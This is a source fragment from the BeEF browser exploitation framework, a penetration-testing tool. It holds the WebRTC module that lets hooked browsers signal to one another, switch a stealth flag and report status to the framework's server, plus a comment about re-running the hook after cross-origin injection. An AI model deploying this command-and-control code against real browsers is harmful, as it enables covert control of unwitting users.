            beef.debug("setRemoteDescription error: " + error);
          });
    } else {
      this.setRemote(message);
    }
  } else if (message.type === 'candidate') {
    beef.debug("Processing signalling message: CANDIDATE");
    var candidate = new RTCIceCandidate({sdpMLineIndex: message.label,
                                         candidate: message.candidate});
    this.noteIceCandidate("Remote", this.iceCandidateType(message.candidate));
    globalrtc[this.peerid].addIceCandidate(candidate, this.onAddIceCandidateSuccess, this.onAddIceCandidateError);
  } else if (message.type === 'bye') {
    this.onRemoteHangup();
  }
}

// Used to set the RTC remote session
Beefwebrtc.prototype.setRemote = function(message) {
    globalrtc[this.peerid].setRemoteDescription(new RTCSessionDescription(message),
       this.onSetRemoteDescriptionSuccess, this.onSetSessionDescriptionError);
}

// As part of the processSignalingMessage function, we check for 'offers' from peers. If there's an offer, we answer, as below
Beefwebrtc.prototype.doAnswer = function() {
  beef.debug('Sending answer to peer.');
  globalrtc[this.peerid].createAnswer(this.setLocalAndSendMessage, this.onCreateSessionDescriptionError, this.sdpConstraints);
}

// Helper method to determine what kind of ICE Candidate we've received
Beefwebrtc.prototype.iceCandidateType = function(candidateSDP) {
  if (candidateSDP.indexOf("typ relay ") >= 0)
    return "TURN";
  if (candidateSDP.indexOf("typ srflx ") >= 0)
    return "STUN";
  if (candidateSDP.indexOf("typ host ") >= 0)
    return "HOST";
  return "UNKNOWN";
}

// Event handler for successful addition of ICE Candidates
Beefwebrtc.prototype.onAddIceCandidateSuccess = function() {
  beef.debug('AddIceCandidate success.');
}

// Event handler for unsuccessful addition of ICE Candidates
Beefwebrtc.prototype.onAddIceCandidateError = function(error) {
  beef.debug('Failed to add Ice Candidate: ' + error.toString());
}

// If a peer hangs up (we bring down the peerconncetion via the stop() method)
Beefwebrtc.prototype.onRemoteHangup = function() {
  beef.debug('Session terminated.');
  this.initiator = 0;
  // transitionToWaiting();
  this.stop();
}

// Bring down the peer connection
Beefwebrtc.prototype.stop = function() {
  this.started = false; // we're no longer started
  this.signalingReady = false; // signalling isn't ready
  globalrtc[this.peerid].close(); // close the RTCPeerConnection option
  globalrtc[this.peerid] = null; // Remove it
  this.msgQueue.length = 0; // clear the msgqueue
  rtcstealth = false; // no longer stealth
  this.allgood = false; // allgood .. NAH UH
}

// The actual beef.webrtc wrapper - this exposes only two functions directly - start, and status
// These are the methods which are executed via the custom extension of the hook.js
beef.webrtc = {
  // Start the RTCPeerConnection process
  start: function(initiator,peer,turnjson,stunservers,verbose) {
    if (peer in beefrtcs) {
      // If the RTC peer is not in a good state, try kickng it off again
      // This is possibly not the correct way to handle this issue though :/ I.e. we'll now have TWO of these objects :/
      if (beefrtcs[peer].allgood == false) {
        beefrtcs[peer] = new Beefwebrtc(initiator, peer, turnjson, stunservers, verbose);
        beefrtcs[peer].initialize();
      }
    } else {
      // Standard behaviour for new peer connections
      beefrtcs[peer] = new Beefwebrtc(initiator,peer,turnjson, stunservers, verbose);
      beefrtcs[peer].initialize();
    }
  },

  // Check the status of all my peers .. 
  status: function(me) {
    if (Object.keys(beefrtcs).length > 0) {
      for (var k in beefrtcs) {
        if (beefrtcs.hasOwnProperty(k)) {
          beef.net.send('/rtcmessage',0,{peerid: k, message: "Status checking - allgood: " + beefrtcs[k].allgood});
        }
      }
    } else {
      beef.net.send('/rtcmessage',0,{peerid: me, message: "No peers?"});
    }
  }
}
beef.regCmp('beef.webrtc');


//
// Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

/*
 Sometimes there are timing issues and looks like beef_init
 is not called at all (always in cross-origin situations,
 for example calling the hook with jquery getScript,
 or sometimes with event handler injections).

 To fix this, we call again beef_init after 1 second.
 Cheers to John Wilander that discussed this bug with me at OWASP AppSec Research Greece
 antisnatchor
 */
//setTimeout(beef_init, 1000);


